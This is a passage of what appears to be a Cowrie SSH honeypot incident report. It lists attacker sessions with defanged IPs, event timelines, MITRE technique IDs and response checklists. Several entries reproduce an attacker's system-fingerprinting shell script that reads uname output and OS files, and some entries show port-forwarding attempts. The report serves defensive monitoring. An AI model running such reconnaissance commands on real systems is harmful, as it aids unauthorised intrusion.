- [ ] Block `31.41.84[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-084ef8bb60ab

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 20:34 |
| **Last Seen** | 2026-07-10 20:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:34:02` | `cowrie.session.connect` |
| `2026-07-10 20:34:03` | `cowrie.client.version` |
| `2026-07-10 20:34:03` | `cowrie.client.kex` |
| `2026-07-10 20:34:04` | `cowrie.login.success` |
| `2026-07-10 20:34:05` | `cowrie.session.params` |
| `2026-07-10 20:34:05` | `cowrie.command.input` |
| `2026-07-10 20:34:05` | `cowrie.log.closed` |
| `2026-07-10 20:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d46cd31ad7d4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:34 |
| **Last Seen** | 2026-07-10 20:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:34:27` | `cowrie.session.connect` |
| `2026-07-10 20:34:27` | `cowrie.client.version` |
| `2026-07-10 20:34:27` | `cowrie.client.kex` |
| `2026-07-10 20:34:28` | `cowrie.login.success` |
| `2026-07-10 20:34:29` | `cowrie.session.params` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:29` | `cowrie.command.success` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:29` | `cowrie.command.input` |
| `2026-07-10 20:34:30` | `cowrie.log.closed` |
| `2026-07-10 20:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9aed7aa6293

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 20:35 |
| **Last Seen** | 2026-07-10 20:35 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:35:18` | `cowrie.session.connect` |
| `2026-07-10 20:35:19` | `cowrie.client.version` |
| `2026-07-10 20:35:19` | `cowrie.client.kex` |
| `2026-07-10 20:35:26` | `cowrie.login.success` |
| `2026-07-10 20:35:30` | `cowrie.session.params` |
| `2026-07-10 20:35:30` | `cowrie.command.input` |
| `2026-07-10 20:35:31` | `cowrie.log.closed` |
| `2026-07-10 20:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bdd18c641dc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 20:35 |
| **Last Seen** | 2026-07-10 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:35:46` | `cowrie.session.connect` |
| `2026-07-10 20:35:46` | `cowrie.client.version` |
| `2026-07-10 20:35:46` | `cowrie.client.kex` |
| `2026-07-10 20:35:47` | `cowrie.login.success` |
| `2026-07-10 20:35:47` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:35:47` | `cowrie.direct-tcpip.data` |
| `2026-07-10 20:35:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc46b8ba998

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:36 |
| **Last Seen** | 2026-07-10 20:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:36:03` | `cowrie.session.connect` |
| `2026-07-10 20:36:03` | `cowrie.client.version` |
| `2026-07-10 20:36:03` | `cowrie.client.kex` |
| `2026-07-10 20:36:04` | `cowrie.login.success` |
| `2026-07-10 20:36:05` | `cowrie.session.params` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:05` | `cowrie.command.success` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:05` | `cowrie.command.input` |
| `2026-07-10 20:36:06` | `cowrie.log.closed` |
| `2026-07-10 20:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561743014e2c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:37 |
| **Last Seen** | 2026-07-10 20:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:37:38` | `cowrie.session.connect` |
| `2026-07-10 20:37:38` | `cowrie.client.version` |
| `2026-07-10 20:37:38` | `cowrie.client.kex` |
| `2026-07-10 20:37:40` | `cowrie.login.success` |
| `2026-07-10 20:37:41` | `cowrie.session.params` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.command.success` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.command.input` |
| `2026-07-10 20:37:41` | `cowrie.log.closed` |
| `2026-07-10 20:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1f6299bb650

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:39 |
| **Last Seen** | 2026-07-10 20:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:39:14` | `cowrie.session.connect` |
| `2026-07-10 20:39:14` | `cowrie.client.version` |
| `2026-07-10 20:39:15` | `cowrie.client.kex` |
| `2026-07-10 20:39:16` | `cowrie.login.success` |
| `2026-07-10 20:39:17` | `cowrie.session.params` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.command.success` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.command.input` |
| `2026-07-10 20:39:17` | `cowrie.log.closed` |
| `2026-07-10 20:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1abfdae2a942

| Field | Detail |
|---|---|
| **Source IP** | `183.239.20[.]236` |
| **First Seen** | 2026-07-10 20:40 |
| **Last Seen** | 2026-07-10 20:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:40:47` | `cowrie.session.connect` |
| `2026-07-10 20:40:48` | `cowrie.client.version` |
| `2026-07-10 20:40:48` | `cowrie.client.kex` |
| `2026-07-10 20:40:51` | `cowrie.login.success` |
| `2026-07-10 20:40:52` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.239.20[.]236` to AbuseIPDB if not already reported
- [ ] Block `183.239.20[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7565bd69ae96

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:40 |
| **Last Seen** | 2026-07-10 20:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:40:56` | `cowrie.session.connect` |
| `2026-07-10 20:40:56` | `cowrie.client.version` |
| `2026-07-10 20:40:56` | `cowrie.client.kex` |
| `2026-07-10 20:40:57` | `cowrie.login.success` |
| `2026-07-10 20:40:58` | `cowrie.session.params` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:58` | `cowrie.command.success` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:58` | `cowrie.command.input` |
| `2026-07-10 20:40:59` | `cowrie.log.closed` |
| `2026-07-10 20:40:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc47c87b4584

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-07-10 20:40 |
| **Last Seen** | 2026-07-10 20:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:40:58` | `cowrie.session.connect` |
| `2026-07-10 20:40:59` | `cowrie.client.version` |
| `2026-07-10 20:40:59` | `cowrie.client.kex` |
| `2026-07-10 20:41:01` | `cowrie.login.success` |
| `2026-07-10 20:41:02` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d65e1847d72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:42 |
| **Last Seen** | 2026-07-10 20:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:42:31` | `cowrie.session.connect` |
| `2026-07-10 20:42:31` | `cowrie.client.version` |
| `2026-07-10 20:42:31` | `cowrie.client.kex` |
| `2026-07-10 20:42:32` | `cowrie.login.success` |
| `2026-07-10 20:42:33` | `cowrie.session.params` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:33` | `cowrie.command.success` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:33` | `cowrie.command.input` |
| `2026-07-10 20:42:34` | `cowrie.log.closed` |
| `2026-07-10 20:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27817e2bdc06

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-10 20:44 |
| **Last Seen** | 2026-07-10 20:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:44:17` | `cowrie.session.connect` |
| `2026-07-10 20:44:18` | `cowrie.client.version` |
| `2026-07-10 20:44:18` | `cowrie.client.kex` |
| `2026-07-10 20:44:20` | `cowrie.login.success` |
| `2026-07-10 20:44:21` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb7d8fb06d2

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-07-10 20:44 |
| **Last Seen** | 2026-07-10 20:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:44:31` | `cowrie.session.connect` |
| `2026-07-10 20:44:32` | `cowrie.client.version` |
| `2026-07-10 20:44:32` | `cowrie.client.kex` |
| `2026-07-10 20:44:34` | `cowrie.login.success` |
| `2026-07-10 20:44:35` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91171048fddf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:45 |
| **Last Seen** | 2026-07-10 20:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:45:32` | `cowrie.session.connect` |
| `2026-07-10 20:45:32` | `cowrie.client.version` |
| `2026-07-10 20:45:32` | `cowrie.client.kex` |
| `2026-07-10 20:45:33` | `cowrie.login.success` |
| `2026-07-10 20:45:33` | `cowrie.session.params` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:33` | `cowrie.command.success` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:33` | `cowrie.command.input` |
| `2026-07-10 20:45:34` | `cowrie.log.closed` |
| `2026-07-10 20:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36067fdde999

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-07-10 20:45 |
| **Last Seen** | 2026-07-10 20:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:45:51` | `cowrie.session.connect` |
| `2026-07-10 20:45:52` | `cowrie.client.version` |
| `2026-07-10 20:45:52` | `cowrie.client.kex` |
| `2026-07-10 20:45:53` | `cowrie.login.success` |
| `2026-07-10 20:45:54` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1fb8d6f49e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:47 |
| **Last Seen** | 2026-07-10 20:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:47:02` | `cowrie.session.connect` |
| `2026-07-10 20:47:02` | `cowrie.client.version` |
| `2026-07-10 20:47:02` | `cowrie.client.kex` |
| `2026-07-10 20:47:02` | `cowrie.login.success` |
| `2026-07-10 20:47:03` | `cowrie.session.params` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:03` | `cowrie.command.success` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:03` | `cowrie.command.input` |
| `2026-07-10 20:47:04` | `cowrie.log.closed` |
| `2026-07-10 20:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53cec234f0bc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-10 20:48 |
| **Last Seen** | 2026-07-10 20:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
